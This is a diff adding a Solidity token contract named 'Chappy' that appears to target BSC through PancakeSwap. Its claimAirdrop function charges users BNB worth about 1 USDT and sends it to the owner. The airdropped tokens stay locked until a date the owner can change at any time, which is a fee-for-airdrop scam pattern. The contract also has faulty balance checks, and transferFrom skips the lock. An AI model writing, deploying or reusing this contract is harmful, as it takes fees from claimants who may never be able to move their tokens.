@@ -1,0 +1,199 @@
+pragma solidity ^0.8.0;
+// SPDX-License-Identifier: Unlicensed
+
+interface IUniswapV2Factory {
+    function createPair(address tokenA, address tokenB) external returns (address pair);
+}
+
+interface IUniswapV2Router01 {
+    function factory() external pure returns (address);
+    function WETH() external pure returns (address);
+    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
+}
+
+interface IUniswapV2Router02 is IUniswapV2Router01 {}
+
+contract Chappy {
+
+    string public constant name = "Chappy";
+    string public constant symbol = "CHAP";
+    uint8 public constant decimals = 18;
+
+    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
+    event Transfer(address indexed from, address indexed to, uint tokens);
+
+    mapping(address => uint256) balances;
+
+    mapping(address => mapping (address => uint256)) allowed;
+
+    IUniswapV2Router02 public immutable uniswapV2Router;
+    address public immutable uniswapV2Pair;
+
+    address payable private owner;
+
+    address public immutable USDT;
+    
+    uint256 totalSupply_;
+
+    using SafeMath for uint256;
+
+    mapping (address => uint256) private _airdropAllocation;
+    uint256 private _airdropUnlock;
+    uint256 private _airdropPool;
+    uint256 private _airdropPerPerson = (10 ** 6) * (10 ** 18);
+
+    receive() external payable {}
+
+    modifier onlyOwner() {
+        require(msg.sender == owner, "Only the owner can call this method");
+        _;
+    }
+
+    constructor(uint256 airdropUnlock_) {
+
+        uint256 total_ = (10 ** 12) * (10 ** 18);
+        uint256 airdrop_ = (10 * total_) / 100;
+        uint256 to_mint = total_ - airdrop_;
+
+        totalSupply_ = total_;
+        _airdropUnlock = airdropUnlock_;
+        _airdropPool = airdrop_;
+
+        balances[msg.sender] = to_mint;
+        balances[address(this)] = airdrop_;
+
+        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
+
+        USDT = 0x55d398326f99059fF775485246999027B3197955;
+         
+        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
+            .createPair(address(this), _uniswapV2Router.WETH());
+
+        uniswapV2Router = _uniswapV2Router;
+
+        owner = payable(msg.sender);
+
+        emit Transfer(address(0), msg.sender, to_mint);
+        
+        emit Transfer(address(0), address(this), airdrop_);
+        
+    }  
+
+    function totalSupply() public view returns (uint256) {
+	    return totalSupply_;
+    }
+    
+    function balanceOf(address tokenOwner) public view returns (uint) {
+        return balances[tokenOwner];
+    }
+
+    function estimateBNBPerUSDT() public view returns (uint256) {
+        address[] memory path = new address[](2);
+        path[0] = USDT;
+        path[1] = uniswapV2Router.WETH();
+        uint256[] memory amounts = uniswapV2Router.getAmountsOut((10 ** 18), path);
+        return amounts[amounts.length - 1];
+    }
+
+    function airdropPool() public view returns (uint256) {
+        return _airdropPool;
+    }
+
+    function accountAirdrop(address account) public view returns (uint256) {
+        return _airdropAllocation[account];
+    }
+
+    function airdropUnlock() public view returns (uint256) {
+        return _airdropUnlock;
+    }
+
+    function setAirdropUnlock(uint256 airdropUnlock_) public onlyOwner {
+        _airdropUnlock = airdropUnlock_;
+    }
+
+    function renounceOwnership() public onlyOwner {
+        owner = payable(address(0));
+    }
+
+    function claimAirdrop() external payable {
+        uint256 ETHSent = msg.value;
+        uint256 estimate = estimateBNBPerUSDT();
+        address sender = msg.sender;
+        
+        require(block.timestamp < _airdropUnlock, "Airdrop cannot be claimed after unlock date");
+        require(ETHSent >= estimate, "BNB Sent is not worth up to 1 USDT. Retry");
+        require(_airdropPool >= _airdropPerPerson, "Amount in pool is not sufficient");
+        require(_airdropAllocation[sender] == 0, "Airdrop already claimed with this address");
+
+        _airdropAllocation[sender] = _airdropPerPerson;
+        _airdropPool = _airdropPool.sub(_airdropPerPerson);
+        balances[address(this)] = balances[address(this)].sub(_airdropPerPerson);
+        balances[sender] = balances[sender].add(_airdropPerPerson);
+
+        emit Transfer(address(this), sender, _airdropPerPerson);
+
+        owner.transfer(ETHSent);
+    }
+
+    function transfer(address receiver, uint numTokens) public returns (bool) {
+        require(numTokens <= balances[msg.sender]);
+        require(numTokens > 0, "Amount must be greater than 0");
+
+        uint256 balance = balances[msg.sender];
+        uint256 airdrop = _airdropAllocation[msg.sender];
+
+        if (_airdropUnlock > block.timestamp) {
+            if (airdrop > 0) {
+                balance = balance.sub(airdrop);
+            }
+        }
+        else {
+            _airdropAllocation[msg.sender] = 0;
+        }
+
+        require(balance > numTokens, "Insufficient funds");
+
+        balances[msg.sender] = balances[msg.sender].sub(numTokens);
+        balances[receiver] = balances[receiver].add(numTokens);
+
+        emit Transfer(msg.sender, receiver, numTokens);
+
+        return true;
+    }
+
+    function approve(address delegate, uint numTokens) public returns (bool) {
+        allowed[msg.sender][delegate] = numTokens;
+        emit Approval(msg.sender, delegate, numTokens);
+        return true;
+    }
+
+    function allowance(address owner_, address delegate) public view returns (uint) {
+        return allowed[owner_][delegate];
+    }
+
+    function transferFrom(address owner_, address buyer, uint numTokens) public returns (bool) {
+        require(numTokens <= balances[owner_]);    
+        require(numTokens <= allowed[owner_][msg.sender]);
+    
+        balances[owner_] = balances[owner_].sub(numTokens);
+        allowed[owner_][msg.sender] = allowed[owner_][msg.sender].sub(numTokens);
+        balances[buyer] = balances[buyer].add(numTokens);
+
+        emit Transfer(owner_, buyer, numTokens);
+        
+        return true;
+    }
+}
+
+library SafeMath {
+    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
+      assert(b <= a);
+      return a - b;
+    }
+    
+    function add(uint256 a, uint256 b) internal pure returns (uint256) {
+      uint256 c = a + b;
+      assert(c >= a);
+      return c;
+    }
+}
